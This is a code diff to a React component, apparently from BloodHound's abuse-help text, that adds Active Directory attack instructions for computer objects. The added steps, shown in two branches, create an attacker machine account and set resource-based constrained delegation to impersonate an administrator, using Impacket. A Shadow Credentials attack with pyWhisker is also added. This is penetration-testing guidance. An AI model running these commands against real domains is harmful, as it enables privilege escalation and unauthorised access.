@@ -43,9 +43,11 @@ const LinuxAbuse = ({ sourceName, sourceType, targetName, targetType, haslaps })
                 </>
             );
         case 'Computer':
-            if (haslaps)
+            if (haslaps) {
                 return (
                     <>
+                        <h4> Retrieve LAPS Password </h4>
+
                         <p>
                             The AllExtendedRights privilege grants {sourceName} the
                             ability to obtain the RID 500 administrator password of{' '}
@@ -68,15 +70,107 @@ const LinuxAbuse = ({ sourceName, sourceType, targetName, targetType, haslaps })
                                 }
                             </code>
                         </pre>
+
+                        <h4> Resource-Based Constrained Delegation </h4>
+
+                        First, if an attacker does not control an account with an
+                        SPN set, a new attacker-controlled computer account can be
+                        added with Impacket's addcomputer.py example script:
+                        <pre>
+                            <code>
+                                {
+                                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
+                                }
+                            </code>
+                        </pre>
+                        We now need to configure the target object so that the attacker-controlled
+                        computer can delegate to it. Impacket's rbcd.py script can be used for that
+                        purpose:
+                        <pre>
+                            <code>
+                                {
+                                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
+                                }
+                            </code>
+                        </pre>
+                        And finally we can get a service ticket for the service name (sname) we
+                        want to "pretend" to be "admin" for. Impacket's getST.py example script
+                        can be used for that purpose.
+                        <pre>
+                            <code>
+                                {
+                                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                                }
+                            </code>
+                        </pre>
+                        This ticket can then be used with Pass-the-Ticket, and could grant access
+                        to the file system of the TARGETCOMPUTER.
+
+                        <h4> Shadow Credentials attack </h4>
+
+                        <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>
+
+                        <pre>
+                            <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
+                        </pre>
+
+                        <p>
+                            For other optional parameters, view the pyWhisker documentation.
+                        </p>
                     </>
                 );
-            else
+            } else {
                 return (
-                    <p>
-                        This ACE is not exploitable under current conditions.
-                        Please report this bug to the BloodHound developers
-                    </p>
+                    <>
+                        <h4> Resource-Based Constrained Delegation </h4>
+
+                        First, if an attacker does not control an account with an
+                        SPN set, a new attacker-controlled computer account can be
+                        added with Impacket's addcomputer.py example script:
+                        <pre>
+                            <code>
+                                {
+                                    "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
+                                }
+                            </code>
+                        </pre>
+                        We now need to configure the target object so that the attacker-controlled
+                        computer can delegate to it. Impacket's rbcd.py script can be used for that
+                        purpose:
+                        <pre>
+                            <code>
+                                {
+                                    "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
+                                }
+                            </code>
+                        </pre>
+                        And finally we can get a service ticket for the service name (sname) we
+                        want to "pretend" to be "admin" for. Impacket's getST.py example script
+                        can be used for that purpose.
+                        <pre>
+                            <code>
+                                {
+                                    "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                                }
+                            </code>
+                        </pre>
+                        This ticket can then be used with Pass-the-Ticket, and could grant access
+                        to the file system of the TARGETCOMPUTER.
+
+                        <h4> Shadow Credentials attack </h4>
+
+                        <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>
+
+                        <pre>
+                            <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
+                        </pre>
+
+                        <p>
+                            For other optional parameters, view the pyWhisker documentation.
+                        </p>
+                    </>
                 );
+            }
         case 'Domain':
             return (
                 <>
